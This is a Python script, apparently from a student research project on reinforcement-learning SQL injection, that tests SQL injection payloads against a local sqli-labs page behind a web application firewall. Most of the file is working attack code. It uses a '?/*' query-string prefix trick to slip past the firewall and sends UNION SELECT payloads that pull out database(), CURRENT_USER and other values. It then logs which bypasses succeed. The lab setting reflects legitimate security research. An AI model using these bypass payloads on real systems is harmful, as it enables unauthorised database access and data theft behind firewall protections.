"""
bypass_lab/test_confirmed_bypass.py
=====================================
Test bypass payload yang sudah difix hex encoding-nya.

Run:
    python3 -m bypass_lab.test_confirmed_bypass
"""
import sys, time
sys.path.insert(0, '/mnt/d/Kuliah/RL/SeqSQLi')
from seqsqli.core.response import classify_response
import requests

PLAIN  = "http://localhost:8081/Less-1/"
WAF    = "http://localhost:8888/Less-1/"
WAFPFX = "http://localhost:8888/Less-1/?/*&id="

# Hex encoding yang BENAR
HEX_S = "53455153514c495f5354415254"   # SEQSQLI_START
HEX_E = "53455153514c495f454e44"       # SEQSQLI_END

FOUND = []


def t(label, payload, use_pfx=False):
    url = WAFPFX if use_pfx else WAF
    enc = requests.utils.quote(payload, safe="',-./0@_~")

    if use_pfx:
        rw = requests.get(url + enc, timeout=8)
    else:
        rw = requests.get(url, params={"id": payload}, timeout=8)

    rp = requests.get(PLAIN, params={"id": payload}, timeout=8)

    ok_w  = classify_response(rw.text, rw.status_code, "union",
                               strict_markers=True) == "SUCCESS"
    ok_p  = classify_response(rp.text, rp.status_code, "union",
                               strict_markers=True) == "SUCCESS"

    idx = rw.text.find("Your Login name:")
    waf_val = rw.text[idx+16:idx+80].split("<")[0].strip() if idx >= 0 else ""

    pfx = "[?/*]" if use_pfx else "[std]"
    tag = "*** BYPASS ***" if ok_w else ("BLOCK" if rw.status_code==403 else "PASS_nodata")
    print(f"  {pfx} plain={ok_p} waf={tag:<16} | {label}")
    if ok_w:
        FOUND.append((label, payload, "?/*" if use_pfx else "std"))
        print(f"    *** SUCCESS: WAF bypass + markers confirmed ***")
    elif waf_val and rw.status_code != 403:
        print(f"    waf_got: {repr(waf_val[:50])}")
    time.sleep(0.3)


print("=" * 65)
print(" CONFIRMED BYPASS — fixed hex encoding")
print("=" * 65)

# ── 1. Hex markers — FIXED (26 dan 22 chars) ─────────────────────────
print("\n[1] Hex markers FIXED — via ?/* prefix")
t("hex SEQSQLI_START/END [?/*]",
  f".1-- -'/0 UNION ALL SELECT 1,0x{HEX_S},0x{HEX_E}'",
  use_pfx=True)

t("hex markers standard WAF (should BLOCK)",
  f".1-- -'/0 UNION ALL SELECT 1,0x{HEX_S},0x{HEX_E}'",
  use_pfx=False)

# ── 2. database() via ?/* ─────────────────────────────────────────────
print("\n[2] database() + hex markers via ?/*")
t("database() col1 + hex markers",
  f".1-- -'/0 UNION ALL SELECT database(),0x{HEX_S},0x{HEX_E}'",
  use_pfx=True)

# ── 3. CURRENT keywords + hex markers ────────────────────────────────
print("\n[3] CURRENT keywords yang sudah terbukti lolos + hex markers")
t("CURRENT_USER + hex [?/*]",
  f".1-- -'/0 UNION ALL SELECT CURRENT_USER,0x{HEX_S},0x{HEX_E}'",
  use_pfx=True)
t("CURRENT_DATE + hex [?/*]",
  f".1-- -'/0 UNION ALL SELECT CURRENT_DATE,0x{HEX_S},0x{HEX_E}'",
  use_pfx=True)

# ── 4. Summary ────────────────────────────────────────────────────────
print("\n" + "=" * 65)
print(f" BYPASS dengan strict markers: {len(FOUND)}")
for label, p, method in FOUND:
    print(f"\n  [{method}] {label}")
    print(f"  {p}")
